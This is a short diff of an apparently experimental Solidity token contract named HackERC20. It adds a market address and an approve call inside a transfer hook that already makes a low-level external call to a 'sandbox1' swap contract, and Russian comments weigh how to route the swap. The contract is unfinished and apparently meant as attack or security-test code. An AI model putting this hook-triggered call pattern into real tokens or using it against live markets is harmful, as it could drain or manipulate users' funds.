@@ -9,14 +9,17 @@ contract HackERC20 is ERC20 {
     //ISandbox1 public sandbox1;
     address public marketAdapter;
     address public sandbox1;
+    address public market;
     constructor(string memory name_,
         string memory symbol_,
         address marketAdapter_,
-        address sandbox1_
+        address sandbox1_,
+        address market_
         ) ERC20(name_, symbol_)  {
         
         _setTrustedMarketAdapter(marketAdapter_);
         _setTrustedSandbox1(sandbox1_);
+        _setMarket(market_);
         
         _mint(msg.sender, 1000000000000000000000000000);
 
@@ -33,6 +36,10 @@ contract HackERC20 is ERC20 {
         sandbox1 = _sandbox1;
     }
 
+    function _setMarket(address _market) internal  {
+        market = _market;
+    }
+
     function _beforeTokenTransfer(address from, address to, uint256 amount) 
         internal 
         override 
@@ -41,6 +48,7 @@ contract HackERC20 is ERC20 {
             //sandbox1.swapExactInput(
             //скорее всего, тут нужно либо вызов делать от имени того, кто первый обмен запустил, либо на контракте хранить еще эти шиткоины и 
             //и давать апрув с контракта шиткоина на контракт маркета
+            approve(market, amount);
             (bool success, ) = 
                 sandbox1.call(
                 abi.encodeWithSignature(
